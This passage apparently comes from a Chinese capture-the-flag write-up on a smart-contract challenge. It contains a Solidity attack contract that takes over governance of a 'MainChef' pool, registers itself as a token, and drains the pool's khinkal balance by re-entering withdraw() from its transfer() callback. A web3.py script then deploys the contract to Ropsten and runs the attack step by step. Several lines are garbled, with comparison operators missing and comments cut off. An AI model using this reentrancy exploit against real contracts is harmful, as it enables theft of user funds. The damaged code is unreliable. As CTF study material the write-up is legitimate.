                return 1e18;
            }
        }
        function transfer(address recipient, uint256 amount) public virtual returns (bool) {
            // reentrant attack exp
            if (pwnedtransferFlag == 1) {
                pwnedtransferFlag = 2;
                if (khinkal.balanceOf(address(target)) > 0) {
                    target.withdraw(pid);
                }
                return true;
            }
            if (pwnedtransferFlag == 2) {
                // 1 + 78333646677 = 78333646678
                // withdraw 500004127749479808 * 2
                uint256 leftBalanceChallenge = khinkal.balanceOf(address(target));
                uint256 withdrawBalance = 500004127749479808 * accKhinkalPerShare / 1e12;
                if (leftBalanceChallenge  0) {
                    target.withdraw(pid);
                }
                return true;
            }
            if (pwnedtransferFlag == 3) {
                pwnedtransferFlag = 0;
                if (khinkal.balanceOf(address(target)) > 0) {
                    target.withdraw(pid);
                }
                return true;
            }
            return true;
        }
        // https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/token/ERC20/ERC20.sol
        function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
            return true;
        }
        function attackPwnedPrepare() public payable onlyOwner {
            target.setGovernance(address(this));
            target.addToken(IERC20(address(this)));
            // after 5 block number
            /** 
             *  internal 5 block number
                khinkalReward = 5 * 31333333337 / 2  = 78333333342
                accKhinkalPerShare = khinkalReward * 1e12 /1e18
                                   = 78333333342 * 1e12 / 1e18
                                   = 78333
                instance = 313337 + khinkalReward
                         = 313337 + 78333333342
                         = 78333646679
                lastKhinkalReward = khinkalReward = 78333333342
                bypass require(pending >> "%.40f" %(39166823339*1e12/78333)
              '500004127749479808.0000000000000000000000000000000000000000'
            */
            target.deposit(pid, 500004127749479808);
        }
        function attackUpdatePool() public payable onlyOwner {
            balanceOfFlag = 0;
            target.updatePool(pid);
            balanceOfFlag = 1;
        }
        function attackPwned() public payable onlyOwner {
            pwnedtransferFlag = 1;
            target.withdraw(pid);
        }
        function validateInstanceAddress() public view returns (bool) {
            return khinkal.balanceOf(address(target)) == 0;
        }
        function getInstance() public view returns (address) {
            return address(target);
        }
        function getTokenAddress() public view returns (address) {
            return address(khinkal);
        }
    }
    /**
     *  1. deployed MainChefAttack
     *  2. MainChefAttack.attackPrepare()
     *  3. MainChefAttack.attackUpdatePool()
     *  4. MainChefAttack.setAccKhinkalPerShare()
     *  3. MainChefAttack.attackPwned()
    */
攻击脚本如下:
    # -*-coding:utf-8-*-    __author__ = 'joker'
    import json
    import time
    from web3 import Web3, HTTPProvider
    from web3.gas_strategies.time_based import fast_gas_price_strategy, slow_gas_price_strategy, medium_gas_price_strategy
    infura_url = 'https://ropsten.infura.io/v3/xxxx'
    # infura_url = 'http://127.0.0.1:7545'
    web3 = Web3(Web3.HTTPProvider(infura_url, request_kwargs={'timeout': 600}))
    web3.eth.setGasPriceStrategy(fast_gas_price_strategy)
    gasprice = web3.eth.generateGasPrice()
    print("[+] fast gas price {0}...".format(gasprice))
    player_private_key = ''
    player_account = web3.eth.account.privateKeyToAccount(player_private_key)
    web3.eth.defaultAccount = player_account.address
    print("[+] account {0}...".format(player_account.address))
    def send_transaction_sync(tx, account, args={}):
        args['nonce'] = web3.eth.getTransactionCount(account.address)
        signed_txn = account.signTransaction(tx.buildTransaction(args))
        tx_hash = web3.eth.sendRawTransaction(signed_txn.rawTransaction)
        time.sleep(30)
        return web3.eth.waitForTransactionReceipt(tx_hash)
    print("[+] step0 deployed attack contract...")
    with open('./attack.abi', 'r') as f:
        abi = json.load(f)
    with open('./attack.bin', 'r') as f:
        code = json.load(f)['object']
    attack_contract = web3.eth.contract(bytecode=code, abi=abi)
    challenge_address = ""
    token_address = ""
    tx = attack_contract.constructor(_target=challenge_address,
                                     _token=token_address)
    attack_contract_address = send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})[
        'contractAddress']
    print("[+] attack contract address {0}...".format(attack_contract_address))
    attack_contract = web3.eth.contract(address=attack_contract_address, abi=abi)
    # step1 attackPrepare
    print("[+] step1 attackPwnedPrepare...")
    tx = attack_contract.functions.attackPwnedPrepare()
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
    #
    block_number = web3.eth.blockNumber
    print("[+] block number {0}...".format(block_number))
    print("[+] waiting for reach block number...")
    while web3.eth.blockNumber != block_number + 4:
        # print("[-] waiting ...")
        continue
    # step2 attackUpdatePool
    print("[+] step2 attackUpdatePool...")
    tx = attack_contract.functions.attackUpdatePool()
    send_transaction_sync(tx, player_account, {'gas': 3000000, 'gasPrice': gasprice})
    #
    input("any key to continue...")
    # sometimes u can not get accurate block number of 4 maybe more
    # to adapt to we need calc and tranfser
    # uint256 leftBalanceChallenge = khinkal.balanceOf(address(target));
    # uint256 withdrawBalance = 500004127749479808 * accKhinkalPerShare / 1e12;
    # if (leftBalanceChallenge 
## Reference
[1]   
[2]
## 附录
本地测试合约代码&攻击合约代码见  
本地测试合约统一从Factory进行部署，部署获取得到instance即为关卡合约地址。
* * *